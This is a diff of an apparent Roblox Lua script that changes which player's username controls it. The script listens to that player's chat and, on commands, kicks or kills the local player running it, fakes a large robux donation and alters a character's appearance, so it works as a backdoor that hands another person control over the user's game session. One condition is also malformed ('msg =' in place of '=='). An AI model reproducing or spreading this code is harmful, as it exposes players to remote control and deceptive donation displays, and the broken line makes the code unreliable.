@@ -1,9 +1,9 @@
 print("Loaded")
 
-game.Players.lzlolaxiamo.Chatted:Connect(function(msg)
+game.Players.xi_amo.Chatted:Connect(function(msg)
     if msg == "here" then
 wait(2)
- _G.WhoDonated = "lzlolaxiamo" -- who donated robux
+ _G.WhoDonated = "xi_amo" -- who donated robux
 _G.HowMuchRobux = 1000000 -- how much robux u want to dono
 _G.WhoGotRobux = game.Players.LocalPlayer.Name -- what person gets robux
 _G.WhoDonatedID = "4006737289"
@@ -1254,7 +1254,7 @@ wait(16)
 Icon:Destroy()
 end
 elseif msg == "kick "..game.Players.LocalPlayer.Name then
-game.Players.LocalPlayer:Kick("Kicked bylzlolaxiamo")
+game.Players.LocalPlayer:Kick("Kicked by xi_amo")
 elseif msg == "kill "..game.Players.LocalPlayer.Name then
 game.Players.LocalPlayer.Character.Humanoid.Health = 0
 elseif msg == "L" then
@@ -1321,14 +1321,14 @@ if workspace:FindFirstChild("CurrentRooms") then
 end 
 elseif msg = "/korhead" then 
 
-	game.Players.lzlolaxiamo.Character.Head.Transparency = 1
-	game.Players.lzlolaxiamo.Character.Head.Transparency = 1
-	for i,v in pairs(game.Players.lzlolaxiamo.Character.Head:GetChildren()) do
+	game.Players.xi_amo.Character.Head.Transparency = 1
+	game.Players.xi_amo.Character.Head.Transparency = 1
+	for i,v in pairs(game.Players.xi_amo.Character.Head:GetChildren()) do
 		if (v:IsA("Decal")) then
 			v.Transparency = 1
 		end
 	end
-		local ply = game.Players.lzlolaxiamo
+		local ply = game.Players.xi_amo
 	local chr = ply.Character
 	chr.RightLowerLeg.MeshId = "902942093"
 	chr.RightLowerLeg.Transparency = "1"
